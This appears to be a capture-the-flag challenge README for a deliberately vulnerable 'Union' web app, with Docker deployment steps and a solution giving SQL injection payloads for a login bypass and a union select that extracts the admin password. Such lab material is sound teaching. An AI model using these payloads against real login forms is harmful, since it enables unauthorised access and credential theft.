Description: Admin has everything you want

PS: The admin’s password is the flag.. 

### Deployment

```sh
git clone https://github.com/aswinmguptha/mwade-challenges/
cd mwade-challenges/Union/src
docker build .
docker run -dp 80:5000 <docker image id>
```

Visit [http://localhost](http://localhost)

### Solution
To bypass login,

	username: admin' or 1=1-- -
	password: 

To perform union injection attack and retrieve admin's password:

	 username: admin
	 password: ' union select password from users -- -
